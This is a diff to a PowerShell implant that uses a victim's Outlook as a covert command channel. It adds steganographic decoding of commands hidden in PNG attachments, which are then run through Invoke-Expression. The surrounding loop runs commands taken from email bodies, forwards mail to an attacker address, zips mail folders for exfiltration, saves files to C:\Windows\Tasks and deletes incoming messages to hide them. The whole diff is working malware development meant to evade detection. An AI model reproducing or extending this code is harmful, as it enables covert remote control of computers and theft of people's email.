@@ -228,6 +228,96 @@ function Get-OutlookMailsAndZip {
     Write-Host "Emails have been zipped and saved at: $ZipFilePath" -ForegroundColor Green
 }
 
+# Steganography to less suspicious
+function Decode-MessageFromImage {
+    param (
+        [string]$ImagePath
+    )
+
+    Add-Type -AssemblyName System.Drawing
+    try {
+        $image = [System.Drawing.Bitmap]::FromFile($ImagePath)
+    } catch {
+        Write-Error "Failed to load the image. Ensure the file is a valid image format."
+        return
+    }
+
+    $binaryMessage = ""
+    $width = $image.Width
+    $height = $image.Height
+
+    try {
+        for ($y = 0; $y -lt $height; $y++) {
+            for ($x = 0; $x -lt $width; $x++) {
+                $pixel = $image.GetPixel($x, $y)
+
+                # Extract the least significant bit from each color channel
+                $binaryMessage += ($pixel.R -band 1)
+                $binaryMessage += ($pixel.G -band 1)
+                $binaryMessage += ($pixel.B -band 1)
+
+                # Check for the termination marker
+                if ($binaryMessage.EndsWith("11111111")) {
+                    break
+                }
+            }
+            if ($binaryMessage.EndsWith("11111111")) {
+                break
+            }
+        }
+    } catch {
+        Write-Error "Error occurred during pixel processing: $_"
+        $image.Dispose()
+        return
+    }
+
+    $image.Dispose()
+
+    if ($binaryMessage.EndsWith("11111111")) {
+        $binaryMessage = $binaryMessage.Substring(0, $binaryMessage.Length - 8)
+    } else {
+        Write-Error "Termination marker not found. The image may not contain a valid message."
+        return
+    }
+
+    $decodedMessage = ""
+    for ($i = 0; $i -lt $binaryMessage.Length; $i += 8) {
+        if ($i + 8 -le $binaryMessage.Length) {
+            $byte = $binaryMessage.Substring($i, 8)
+            $decodedMessage += [char]([convert]::ToInt32($byte, 2))
+        }
+    }
+
+    return $decodedMessage
+}
+
+function Execute-PowerShellCommand {
+    param (
+        [string]$Command
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Command)) {
+        Write-Error "Command is empty or null. Skipping execution."
+        return
+    }
+
+    try {
+        Write-Host "Executing command: $Command"
+        # Capture the output as an array of lines
+        $result = Invoke-Expression $Command | Out-String
+        $currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm"
+        
+        # Append the result with proper newlines preserved
+        $global:allResult += "**************** $Command Executed ($currentDateTime) ************`n"
+        $global:allResult += $result + "`n`n`n`n"
+        
+        Write-Host "Command output:"
+        Write-Host $result
+    } catch {
+        Write-Error "Error executing command: $_"
+    }
+}
+
 
 # Execute functions
 Disable-OutlookDesktopAlerts
@@ -247,6 +337,7 @@ $serverAddress = "attackerSender@testmail.com"
 while ($true) {
     # Get current email count
     $currentCount = $inbox.Items.Count
+    $steganoIsUsed = $false
     Write-Host "CurrentCount=", $currentCount
     # Check if new mail has arrived
     if ($currentCount -gt $previousCount) {
@@ -261,60 +352,70 @@ while ($true) {
                 # Check for attachments
                 for ($i = 1; $i -le $newMail.Attachments.Count; $i++) {
                     $attachment = $newMail.Attachments.Item($i)
+#		            Write-Host "attachment=", $attachment
+#		            Write-Host "attachment.FileName=", $attachment.FileName
 #                    $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $attachment.FileName)
                     $taskFolderPath = "C:\Windows\Tasks"
                     $tempFilePath = [System.IO.Path]::Combine($taskFolderPath, $attachment.FileName)
 		            Write-Host "tempFilePath=", $tempFilePath
                     $attachment.SaveAsFile($tempFilePath)
 
+                    # Check if the attachment is a .png file
+                    if ($attachment.FileName.EndsWith(".png")) {
+                        Write-Host "Detected .png attachment. Decoding..."
+                        $decodedMessage = Decode-MessageFromImage -ImagePath $tempFilePath
+                        if ($decodedMessage) {
+                            Write-Host "Decoded message: $decodedMessage"
+                            Execute-PowerShellCommand -Command $decodedMessage
+                            $steganoIsUsed = $true
+                        } else {
+                            Write-Error "Failed to decode the .png file."
+                        }
+                    } else {
+                        Write-Host "Attachment is not a .png file."
+                    }
                     # Read RAW data (example purpose)
-                    $rawData = [System.IO.File]::ReadAllBytes($tempFilePath)
+#                    $rawData = [System.IO.File]::ReadAllBytes($tempFilePath)
                 }
 
-                $body = $newMail.Body
-                Write-Host "Email body: $body"
-                $newMail.Delete()
-                Write-Host "Mail has been deleted."
+                $responseMail = $outlook.CreateItem([Microsoft.Office.Interop.Outlook.OlItemType]::olMailItem)                
+                if ($steganoIsUsed -eq $false) {
+                    $body = $newMail.Body
+                    Write-Host "Email body: $body"
+                    $newMail.Delete()
+                    Write-Host "Mail has been deleted."
 
-                # Parse comma-separated data
-                $parsedData = $body -split ";"
+                    # Parse comma-separated data
+                    $parsedData = $body -split ";"
 
-                # Create new reply email
-                $responseMail = $outlook.CreateItem([Microsoft.Office.Interop.Outlook.OlItemType]::olMailItem)
+                    # Create new reply email
 
-                foreach ($item in $parsedData) {
-                    $trimmedItem = $item.Trim()
-                    Write-Host "item === $trimmedItem"
+                    foreach ($item in $parsedData) {
+                        $trimmedItem = $item.Trim()
+                        Write-Host "item === $trimmedItem"
 
-                    # Check for 'download ' prefix
-                    if ($trimmedItem.StartsWith("download ")) {
-                        $fileName = $trimmedItem.Substring(9).Trim()
-                        # Call function to process
-                        ProcessDownloadCommand -fileName $fileName -responseMail ([ref]$responseMail)
-                    } elseif ($trimmedItem.StartsWith("forward")) {
-                        CreateForwardRule -ruleName "ForwardRule" -recipientEmail $serverAddress
-                    } elseif ($trimmedItem.StartsWith("listFolders")) {
-                        Get-OutlookFolders
-                    } elseif ($trimmedItem.StartsWith("getFolders ")) {
-                        $folderName = $trimmedItem.Split(' ')[1]
-                        # Call function to process
-                        Get-OutlookMailsAndZip -FolderName $folderName -ZipFilePath "C:\Windows\Tasks\mails.zip" -responseMail ([ref]$responseMail)
-                    } elseif ($trimmedItem.StartsWith("search")) {
-                        # Extract keyword after "search" (get second part by splitting by space)
-                        $searchKeyword = $trimmedItem.Split(" ")[1]    
-                        # Call function with extracted keyword
-                        SearchOutlookEmails -searchSubject $searchKeyword -daysAgo 30
-                    } else {
-                        # Execute PowerShell command
-                        $result = Invoke-Expression $trimmedItem
-                        $currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm"
-
-                        # Add current date and time to command result
-                        $global:allResult += "**************** $trimmedItem Executed ($currentDateTime) ************`n"
-                        $global:allResult += $result + "`n`n`n`n"
-                        # Display command result
-                        Write-Host "Command input: $trimmedItem"
-                        Write-Host "Command output: $result"
+                        # Check for 'download ' prefix
+                        if ($trimmedItem.StartsWith("download ")) {
+                            $fileName = $trimmedItem.Substring(9).Trim()
+                            # Call function to process
+                            ProcessDownloadCommand -fileName $fileName -responseMail ([ref]$responseMail)
+                        } elseif ($trimmedItem.StartsWith("forward")) {
+                            CreateForwardRule -ruleName "ForwardRule" -recipientEmail $serverAddress
+                        } elseif ($trimmedItem.StartsWith("listFolders")) {
+                            Get-OutlookFolders
+                        } elseif ($trimmedItem.StartsWith("getFolders ")) {
+                            $folderName = $trimmedItem.Split(' ')[1]
+                            # Call function to process
+                            Get-OutlookMailsAndZip -FolderName $folderName -ZipFilePath "C:\Windows\Tasks\mails.zip" -responseMail ([ref]$responseMail)
+                        } elseif ($trimmedItem.StartsWith("search")) {
+                            # Extract keyword after "search" (get second part by splitting by space)
+                            $searchKeyword = $trimmedItem.Split(" ")[1]    
+                            # Call function with extracted keyword
+                            SearchOutlookEmails -searchSubject $searchKeyword -daysAgo 30
+                        } else {
+                            # Execute PowerShell command
+                            Execute-PowerShellCommand -Command $trimmedItem
+                        }
                     }
                 }
 
@@ -349,4 +450,5 @@ while ($true) {
 
     # Check every 5 seconds
     Start-Sleep -Seconds 5
+}
 }
